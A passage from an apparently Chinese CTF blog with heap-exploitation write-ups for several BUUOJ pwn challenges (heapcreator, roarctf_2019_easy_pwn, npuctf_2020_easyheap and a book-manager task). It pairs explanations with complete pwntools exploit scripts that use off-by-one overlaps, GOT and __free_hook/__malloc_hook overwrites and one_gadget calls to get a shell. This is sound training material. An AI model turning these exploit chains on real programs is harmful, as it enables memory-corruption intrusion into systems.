&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(free_got_addr)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>通过下图发现，伪造好free_got的地址放到description_chunk的位置，是开了pie。因此是行不通的，这里采用了另一种方法来泄露libc基地址。</p>
<p><img src="/../img/image-20221007204752038.png" alt="image-20221007204752038"></p>
<h4 id="通过mmap映射超大区域，来泄露libc基地址"><a href="#通过mmap映射超大区域，来泄露libc基地址" class="headerlink" title="通过mmap映射超大区域，来泄露libc基地址"></a>通过mmap映射超大区域，来泄露libc基地址</h4><p>在这之前，需要先看一下进程的空间布局。下图转自<a href="https://blog.csdn.net/cztqwan/article/details/80248479">(30条消息) 进程的内存空间布局_cztqwan的博客-CSDN博客_进程内存布局</a></p>
<p><img src="/../img/image-20221007204803175.png" alt="image-20221007204803175"></p>
<p>每个蓝色空间代表的区域，是否彼此存在随机的偏移，用了random offset来标注。可以看到<strong>内核空间，栈，内存映射段等等都存在着随机偏移，因此我们获取了栈地址也无法利用偏移来算出堆的地址</strong>，其余也是同理。但是<strong>内存映射段都是mmap映射的区域，包括了动态链接库（这里我是这么理解的，如果不对的话，还请指正），因此我们再用mmap映射一块区域，依旧是和动态链接库同属于一大块区域。因此新映射的这块区域和libc基地址存在固定偏移</strong>。怎么触发mmap映射一块区域呢？利用malloc申请一块超大内存来实现，同时这个地址也会被记录在结构体堆块中。</p>
<p>因此我们将结构体堆块中的description_chunk_addr改成<strong>指向mmap申请的那个地址</strong>即可(这个地址肯定是位于堆上的，因此我们现在需要获取一个堆的地址)</p>
<p>考虑到author name和结构体堆块的地址紧挨着，因此我们可以将author name给填满，然后打印author name，就得到了一个堆地址，脚本如下：</p>
<p><img src="/../img/LE5DOxmh7TVAZRU-1665146431267-54.png" alt="image-20220603202640806"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,fake_struct)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br></pre></td></tr></table></figure>



<p>接下来先申请一块超大内存，然后利用偏移将结构体堆块(这个结构体堆块是可控的那个堆块）中的description_addr改成指向结构体堆块（这个结构体堆块是存放mmap映射地址的那个堆块）中存放description_addr的地址。</p>
<p><img src="/../img/image-20221007204827458.png" alt="image-20221007204827458"></p>
<p>然后去泄露这个libc地址，脚本如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br></pre></td></tr></table></figure>

<p>拿到了libc基地址，我们就去劫持__free_hook，放入one_gadget地址，劫持方法跟泄露libc地址一样，我们将结构体堆块（这个结构体堆块是存放mmap映射地址的那个堆块）中的description改成__free_hook的地址，然后编辑该结构体，写入one_gadget地址。最后再释放掉随便一个堆块，即可获取shell。劫持__free_hook部分的脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>



<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x128B</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="number">0xd0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;tttt&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">leak_heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_heap_addr&#x27;</span>,<span class="built_in">hex</span>(leak_heap_addr))</span><br><span class="line"></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct+=p64(leak_heap_addr+<span class="number">0x70</span>)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;leak_libc_addr&#x27;</span>,<span class="built_in">hex</span>(leak_libc_addr))</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x5ca010</span></span><br><span class="line">log(<span class="string">&#x27;libc_base_addr&#x27;</span>,<span class="built_in">hex</span>(libc_base_addr))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base_addr+<span class="number">0x4527a</span></span><br><span class="line">fake_struct=p64(<span class="number">0x1</span>)<span class="comment">#struct_chunk_id</span></span><br><span class="line">fake_struct+=p64(<span class="number">0</span>)<span class="comment">#book_name_addr</span></span><br><span class="line">fake_struct=p64(free_hook)<span class="comment">#description_addr</span></span><br><span class="line">fake_struct+=p64(<span class="number">0x100</span>)<span class="comment">#description_size</span></span><br><span class="line">edit(<span class="number">1</span>,fake_struct)</span><br><span class="line">edit(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><h3 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h3><p>利用off_by_one把原本的结构体堆块释放再申请变成了申请的堆块，而原本的申请堆块释放再申请成了结构体堆块，从而控制结构体堆块中的堆块信息。关键点就是要把第二个堆块申请成0x10字节的（因为要保证申请结构体堆块的时候，把这个堆块释放掉再申请回来）</p>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007204845732.png" alt="image-20221007204845732"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>各个函数实现的什么功能，我就不说了，应该都能看出来。分析几个有用的点。</p>
<p>首先这道题是有一个结构体（malloc申请了它的大小为0x10)，它用来记录申请的每个chunk的size和地址。（从下面两个图片可以分析出来）</p>
<p><img src="/../img/ZC1bBRYu9pnxK5q-1665146431268-57.png" alt="image-20220602080236010"></p>
<p><img src="/../img/WhklgpXZ3A1yY9L-1665146431268-58.png" alt="image-20220602080259732"></p>
<p>而实例化的每个结构体的地址存放到了bss段上。而之后去寻找指定的chunk进行删，改，打印操作都是先去bss段上去找存放的对应结构体，然后根据偏移来寻找其中的记录信息的size和地址成员。</p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><img src="/../img/image-20221007204901719.png" alt="image-20221007204901719"></p>
<p>这里可以输入比申请的size多一个字节的数据，存在刻意的off_by_one漏洞。</p>
<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>我们先申请两个chunk，看一下布局是怎样的。</p>
<p><img src="/../img/image-20221007204910840.png" alt="image-20221007204910840"></p>
<p>可以发现我们每添加一个chunk，都会在它上面（低地址）有一个，结构体堆块来记录信息。可是现在我们可以用edit往里面多写一个数据，正好可以溢出到下一个结构体堆块的size位，这意味着可以控制下一个结构体堆块的大小。</p>
<p><img src="/../img/image-20221007204918905.png" alt="image-20221007204918905"></p>
<p>现在我们利用溢出把这个chunk的大小改成0x41（如上图），这就意味着程序现在把原本的结构体堆块和我们申请的chunk当成了一个结构体chunk。现在我们执行delete(1)将其删除，我们就会得到两个处于释放掉的chunk（把申请的chunk（大小为0x20)和结构体堆块（此时是0x41了）都释放掉了）如下图</p>
<p><img src="/../img/image-20221007204926366.png" alt="image-20221007204926366"></p>
<p>接下来就是核心利用点，我们再申请0x30的大小，这样fastbin里0x40的chunk就会被申请回原来的位置。与此同时程序会自己申请一个0x10的chunk，也就将fastbin里的0x20也申请回去了。<strong>但0x40的这个chunk包含了0x20的这个chunk，而0x40是用户堆块，我们可以往里面写入数据，从而修改里面的0x20的结构体堆块。</strong>(如下图)</p>
<p><img src="/../img/image-20221007204934515.png" alt="image-20221007204934515"></p>
<p><u>原本结构体堆块是来描述chunk1的信息的（换句话就是，谁是chunk1是由结构体堆块说了算），结果现在结构体堆块到了chunk1的里面，因此现在我们就可以通过控制结构体堆块来伪造chunk1。</u></p>
<p>我们将chunk1的地址改成（也就是在改结构体堆块的地址成员）atoi的got表，再执行show函数的时候，本来是打印chunk1地址里的内容的，可是现在chunk1的地址改成了atoi的got表，因此实现了泄露atoi的真实地址。同理，执行edit函数的时候，本来是要修改chunk1地址里的内容，结果现在chunk1的地址改成了atoi的got表，因此就相当于修改atoi的真实地址了，改为system，传入&#x2F;bin&#x2F;sh即可获取shell。<strong>（要注意的就是写入atoi的got表时，顺便要伪造一个size，因为edit的时候还需要用到这个size，如果填充成0的话，是写不进去数据的）</strong></p>
<h3 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400A43</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29606)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x20</span>)+p64(atoi_got_addr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr_bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略;"></a>保护策略;</h3><p><img src="/../img/image-20221007205054593.png" alt="image-20221007205054593"></p>
<h3 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/image-20221007205111216.png" alt="image-20221007205111216"></p>
<p>猛一看感觉是常规堆溢出，没有对edit函数中的输入数据的大小做检查。不过仔细点开sub_E26这个函数发现，是进行了检查，如果edit函数中的size大于了add函数时堆块的大小，那么就选择add函数时堆块的大小，如果edit函数中的size小于了add函数时创建的堆块大小，那么就选择edit函数的size。</p>
<p>不过还有一种情况产生了off by one的漏洞，也就是edit函数中的size正好比add函数创建堆块大小大了10,，此时就会产生off by one漏洞（如下）</p>
<p><img src="/../img/image-20221007205123375.png" alt="image-20221007205123375"></p>
<h3 id="利用思路：-3"><a href="#利用思路：-3" class="headerlink" title="利用思路："></a>利用思路：</h3><p>然后就是常规的off by one手法，上面已经讲过了。大致就是off by one造成合并之后，spy_chunk位于了一片free的内存中，然后进行申请一定大小的size，正好将spy_chunk的用户区域上存放unsortedbin 中的fd指针，然后将其打印出来，获取libc基地址。</p>
<p>然后将spy chunk释放掉，再申请回来，打fastbin attack，将__malloc_hook申请出来，打one_gadget。</p>
<p>然而发现所有的one_gadget都不能使用，那选择用realloc函数来调整栈帧，再打one_gadget。使用realloc函数调整栈帧可以看<a href="https://www.cnblogs.com/ZIKH26/articles/16421631.html">这篇文章</a></p>
<h3 id="EXP：-2"><a href="#EXP：-2" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28799</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) </span><br><span class="line">     </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merged chunk</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#merge chunk</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent merge chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="number">0x60</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x100</span>)+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">write(<span class="number">1</span>,<span class="number">114</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">malloc_hook=libc_base_addr+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#realloc_addr=libc_base_addr+libc.symbols[&#x27;realloc&#x27;]</span></span><br><span class="line">realloc_addr=libc_base_addr+<span class="number">0x846c0</span></span><br><span class="line">write(<span class="number">2</span>,<span class="number">0x8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=<span class="number">0xb</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">16</span>)<span class="comment">#p64(one_gadget)</span></span><br><span class="line">write(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xccc)</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007205137521.png" alt="image-20221007205137521"></p>
<blockquote>
<p> 这道题考察的off by one，但是跟以往用off by one来让堆块合并制造堆块重叠的方式不同。这道题由于限制了申请堆块的大小，让chunk释放之后无法进入unsorted bin (这就意味着堆块无法触发合并)。所以采用伪造size，然后直接释放将其造成堆块重叠。</p>
</blockquote>
<h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><h3 id="保护策略：-3"><a href="#保护策略：-3" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007205201197.png" alt="image-20221007205201197"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/../img/image-20221007205223694.png" alt="image-20221007205223694"></p>
<p>在edit函数中，<u>输入的数据比申请的chunk范围大了一个字节。然后创建堆块的时候发现只能创建0x18或者0x38的堆块，这正好是off by one利用的前提</u>（如下图）。</p>
<p><img src="/../img/image-20221007205233601.png" alt="image-20221007205233601"></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于申请的堆块都属于tcachebin的范围，释放掉之后也无法进行合并。所以我们不往制造堆块合并那个方向考虑。<strong>这道题的特殊性是存在指针堆块（就是程序自己申请了一个堆块，里面存放了我们申请堆块的指针）</strong>，像这种题目我们通常采用篡改指针堆块里存放的指针，而且通常是用互换指针堆块和用户堆块的方法。</p>
<p>以这道题为例，我们申请两个堆块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x18,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x18,&#x27;bbbb&#x27;)</span><br></pre></td></tr></table></figure>

<p>将第一个堆块当做溢出堆块，然后去改变第二个指针堆块的size，将其size位改为0x41。</p>
<blockquote>
<p>为什么要改成0x41?</p>
<p>因为我们只能申请0x18和0x38两种大小的堆块，如果申请0x18那么得到的就是0x20大小的堆块，和指针堆块一样大，那还怎么堆块重叠呢？所以我们只能申请0x38大小的堆块，得到的是0x40大小的堆块，我们将第二个指针堆块的size位改为0x41之后，再申请一个0x38大小的堆块，就会把原本指针堆块的位置申请回来(因为它的大小被伪造成了0x41)当做用户堆块，那么此时真正的指针堆块就和用户堆块造成了重叠(如下图)</p>
